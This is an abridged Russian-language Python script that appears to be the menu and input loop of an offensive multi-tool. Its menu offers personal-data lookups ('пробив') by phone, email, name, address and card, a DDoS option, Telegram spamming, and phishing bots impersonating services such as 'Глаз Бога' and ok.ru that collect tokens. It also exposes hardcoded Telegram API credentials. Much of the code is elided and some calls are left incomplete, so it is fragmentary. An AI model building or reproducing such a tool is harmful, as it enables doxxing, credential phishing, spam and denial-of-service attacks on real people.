...
menu = '''
1: Пробив по номеру<       │ 11: WEB-CRAWLER<                    │ 21: ГЕНЕРАТОР ВЫМЫШЛЕННОЙ КАРТЫ<         
2: Пробив по почте<        │ 12: cBаT БаHB0Pд<                   │ 22: ПАРСЕР тг<                 
3: Пробив по нику<         │ 13: Пробив телеграмм<               │ 23: СПАММЕР тг<                 
4: Рассылка<               │ 14: ТРАФФЕР<                        │ 24: поРТ СКАНЕР<                        
5: DDOS<                   │ 15: ГЕНЕРАТОР сложного пароля<      │ 25: Пробив по КАРТЕ<                     
6: Пробив по бд<           │ 16: ГЕНЕРАТОР личности<             │ 26: Пробив по ВК<                        
7: Пробив по фио<          │ 17: ПРОКСИ<                         │ 27: АВТООТВЕТЧИК<             
8: Фишинг<                 │ 18: Пробив по АДРЕСУ<               │ 28: ЛОГГЕР<       
9: Пробив по ip<           │ 19: ФИШИНГ "АНОНИМНЫЙ ЧАТ"<         │ 29: ПАРСЕР<      
10: Инфо о сайие<          │ 20: ФИШИНГ "ГЛАЗ БОГА"<             │ 30: Пробив SYSADMIN<                      
───────────────────────────┼─────────────────────────────────────┼──────────────────────────────────────────
31: XSS SCANER<            │ 33: Пробив САБДОМЕНА<               │ 35: ДАМПИНГ САЙТА<
...
while True:
  ...
  choice = Write.Input('\nВыберите номер функции > ', Colors.purple_to_blue, interval=0.005)
...
2 шаг: ввести свой Telegram айди в строку с айди
  ...
  if choice == '19':
        ...
        bot.polling()
  if choice == '18':
    adress = Write.Input("Введите адрес: ", Colors.purple_to_blue, interval=0.005) 
...
{'Общественная организация:':<20}{data[23]}
  ...
  if choice == '4':
    ...
    api_id = '21782455'
    api_hash = '6a75750gnee5acb3asbbde2me3325l31'
    message = Write.Input('\nВведите текст для рассылки: ', Colors.purple_to_blue, interval=0.005)
    num_messages = int(Write.Input('Введите количество сообщений: ', Colors.purple_to_blue, interval=0.005))
  ...
  if choice == '5':
      url = Write.Input('URL: ', Colors.purple_to_blue, interval=0.005)
      num_requests = int(Write.Input('Введите количество запросов: ', Colors.purple_to_blue, interval=0.005))
...
6: Одноклассники(ok.ru)
      ...
      choice_fish = Write.Input('\nВыберите пункт фишинга > ', Colors.purple_to_blue, interval=0.005)
      if choice_fish == '6':
          log = open('bot-log.txt', 'a+', encoding='utf-8')
          ID = Write.Input('Введите свой айди:  ', Colors.purple_to_blue, interval=0.005)
          Tokenccc = Write.Input('Введите токен:  ', Colors.purple_to_blue, interval=0.005)
      ...
      if choice_fish == '2':
          log = open('bot-log.txt', 'a+', encoding='utf-8')
          ID = Write.Input('Введите свой айди:  ', Colors.purple_to_blue, interval=0.005)
          Tokenc = Write.Input('Введите токен:  ', Colors.purple_to_blue, interval=0.005)
      ...
      if choice_fish == '1':
          ...
          log = open('bot-log.txt', 'a+', encoding='utf-8')
          ID = Write.Input('Введите свой айди: ', Colors.purple_to_blue, interval=0.005)
          Tokenv = Write.Input('Введите токен: ', Colors.purple_to_blue, interval=0.005)
          ...
          bot.polling()
  if choice == '15':
      password_length = int(Write.Input('Введите длину пароля: ', Colors.purple_to_blue, interval=0.005))

      complexity = Write.Input('Выберите сложность (low, medium, high): ', Colors.purple_to_blue, interval=0.005)
  ...
  if choice == '2':
    search_term = Write.Input("Введите почту: ", Colors.purple_to_blue, interval=0.005)
    Search

  if choice == '13':
    search_term = Write.Input("Введите айди телеграмм: ", Colors.purple_to_blue, interval=0.005)
    Search

      

  if choice == '1':
    Term = Write.Input("Введите номер телефона(без +): ", Colors.purple_to_blue, interval=0.005)
    Search(Term)

          
  if choice == '6':
      path = Write.Input("Введите путь к БД: ", Colors.purple_to_blue, interval=0.005)
      search_text = Write.Input("Введите текст:  ", Colors.purple_to_blue, interval=0.005)
  ...
  if choice == '12':
    input_text = Write.Input("Введите текст: ", Colors.purple_to_blue, interval=0.005) 
    transformed_text = transform_text(input_text)
    Write.Print("Результат > " + transformed_text + "\n", Colors.red_to_purple, interval=0.005)

  
  if choice == '10':
    domain = Write.Input("Введите домен сайта: ", Colors.purple_to_blue, interval=0.005) 
    get_website_info(domain)

  if choice == '9':
    ip_address = Write.Input("Введите IP-адрес для поиска: ", Colors.purple_to_blue, interval=0.005)
    result = ip_lookup(ip_address)
    Write.Print(result, Colors.red_to_yellow, interval=0.005) 

  if choice == '11':
    start_url = Write.Input('Ссылка: ', Colors.purple_to_blue, interval=0.005)
